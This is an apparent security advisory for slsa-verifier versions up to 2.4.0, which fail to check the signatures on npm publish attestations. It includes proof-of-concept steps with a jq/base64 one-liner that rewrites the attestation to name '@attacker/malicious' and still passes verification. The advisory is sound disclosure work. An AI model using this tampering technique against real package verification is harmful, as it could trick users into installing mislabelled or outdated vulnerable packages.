title: "slsa-verifier vulnerable to mproper validation of npm's publish attestations"
description: "### Summary\n\n`slsa-verifier<=2.4.0` does not correctly verify npm's
  [publish](https://github.com/npm/attestation/tree/main/specs/publish/v0.1) attestations
  signature.\n\n### Proof of concept\n\nSteps to reproduce:\n1. `curl -Sso attestations.json
  $(npm view @trishankatdatadog/supreme-goggles --json | jq -r '.dist.attestations.url')`\n2.
  `curl -Sso supreme-goggles.tgz \"$(npm view @trishankatdatadog/supreme-goggles --json
  | jq -r '.dist.tarball')\"`\n3. In `attestations.json`, take the value addressed
  by the `jq` selector `.attestations[0].bundle.dsseEnvelope.payload`, base64decode
  it, tamper with it, base64encode that, and replace the original value with that.
  Save the file as `attestations_tampered.json`.\n Here is an example command to replace
  the package name with `@attacker/malicious`:\n `jq -r \".attestations[0].bundle.dsseEnvelope.payload
  = \\\"$(jq -r '.attestations[0].bundle.dsseEnvelope.payload | @base64d' < attestations.json
  | jq '.subject[0].name = \"pkg:npm/%40attacker/malicious\"' | base64 -w0)\\\"\"
  < attestations.json > attestations_tampered.json`\n5. `SLSA_VERIFIER_EXPERIMENTAL=1
  slsa-verifier verify-npm-package supreme-goggles.tgz --attestations-path attestations_tampered.json
  --builder-id \"https://github.com/actions/runner/github-hosted\" --package-name
  \"@trishankatdatadog/supreme-goggles\" --package-version 1.0.5 --source-uri github.com/trishankatdatadog/supreme-goggles`\n6.
  The result is that `slsa-verifier` fails to detect this tampering of the publish
  attestation (unlike with the provenance attestation) and returns `PASSED`.\n\n###
  Impact\n\nAn attacker who controls what packages and attestations are shown to a
  user _can_ associate a package with an arbitrary name and version that do _not_
  match what the user expects from the publish attestation. Furthermore, the package
  digest in the publish attestation need _not_ match its counterpart in the provenance
  attestation. However, the attacker _cannot_ associate the given package with an
  arbitrary source and builder that the user does not expect from the provenance attestation.
  Thus, the attacker could, for example, convince package managers to install authentic
  but older versions of packages that contain known, exploitable vulnerabilities.\n\nSeverity
  is considered low because 1) it does not invalidate the provenance and 2) support
  for npm is currently experimental.\n\n### Patches\n\nPR [#705](https://github.com/slsa-framework/slsa-verifier/pull/705)
  should fix this issue which, in turn, should not exist in `>2.4.0`.\n\n### Workarounds\n\nThere
  is no easy way for users to fix or remediate this vulnerability without upgrading,
  short of verifying npm's publish attestations themselves, _and_ cross-verifying
  it against GHA's provenance attestations.\n\n### References\n\n* [Original OpenSSF
